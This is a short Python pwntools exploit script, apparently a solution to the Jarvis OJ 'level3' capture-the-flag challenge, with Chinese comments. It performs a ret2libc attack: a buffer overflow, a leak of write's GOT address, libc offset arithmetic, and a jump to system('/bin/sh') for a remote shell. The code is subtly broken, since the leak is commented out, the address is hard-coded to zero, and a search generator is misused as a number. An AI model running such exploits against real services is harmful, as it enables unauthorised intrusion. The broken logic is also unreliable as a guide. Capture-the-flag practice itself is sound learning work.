# -*- coding: utf-8 -*-
from pwn import *
r = remote('pwn2.jarvisoj.com', 9879)

level3 = ELF('./level3')
libc = ELF('./libc-2.19.so')

junk = 'a' * (0x88 + 4)

func_vul_addr = 0x804844b

write_symbol = level3.symbols['write']
print("write_symbol=>", hex(write_symbol))

write_plt = level3.plt['write']
print("write_plt=>", hex(write_plt))

write_got = level3.got['write']
print("write_got=>", hex(write_got))


#write(int fd, const void *buf, size_t n)
#通过write函数获得write的got地址，即在libc模块中的地址
#write函数执行时，got表中的地址已经被重写为write在内存中的实际地址
#调用write后，令其返回到vul函数，目的是为了再次执行read
#                 ret_addr         write的返回地址      fd       buf              n
payload1 = junk + p32(write_plt) + p32(func_vul_addr) + p32(1) + p32(write_got) + p32(4)

r.recvuntil("Input:\n")
r.sendline(payload1)

#write_addr = u32(r.recv(4))
write_addr = 0x00
#函数在libc中的plt地址
libc_write_plt = libc.symbols['write']
libc_system_plt = libc.symbols['system']
libc_bin_sh_plt = libc.search('/bin/sh')
print("libc_bin_sh_plt=>", hex(*libc_bin_sh_plt))

#计算libc中write函数GOT与PLT的偏移，可以通过偏移定位其它函数在内存中的地址
libc_offset = write_addr - libc_write_plt

system_addr = libc_system_plt + libc_offset
bin_sh_addr = libc_bin_sh_plt + libc_offset

#                 ret_addr           任意              参数：'/bin/sh'
payload2 = junk + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)

r.recvuntil("Input:\n")
r.sendline(payload2)

r.interactive()
